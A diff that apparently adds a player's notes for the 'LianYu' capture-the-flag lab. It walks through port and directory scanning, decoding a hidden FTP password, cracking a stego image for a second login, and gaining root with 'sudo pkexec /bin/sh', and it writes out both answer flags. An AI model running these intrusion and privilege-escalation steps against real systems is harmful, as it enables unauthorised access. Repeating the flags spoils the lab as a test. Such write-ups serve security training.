@@ -1,0 +1,45 @@
+### PORTS
+1/tcp  open  ftp     vsftpd 3.0.2
+22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
+80/tcp  open  http    Apache httpd
+111/tcp open  rpcbind 2-4 (RPC #100000)
+
+found http://10.10.90.175/island/
+
+vigilante
+
+gobuster dir -u 10.10.90.175/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o info/log_gobuster_island.txt
+
+found http://10.10.90.175/island/2100
+
+gobuster dir -u 10.10.90.175/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o info/log_gobuster_island.txt -x .ticket
+
+found http://10.10.90.175/island/2100/green_arrow.ticket
+
+RTy8yhBQdscX
+
+crack with base58: !#th3h00d
+
+ftp 10.10.90.175
+vigilante !#th3h00d
+slade
+
+
+pip3 install stegcracker
+
+stecrack file wordlist
+
+file aa.jpg.out
+
+unzip aa.jpg.out
+
+slade : M3tahuman
+
+THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
+
+User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec
+
+sudo /usr/bin/pkexec /bin/sh
+
+THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
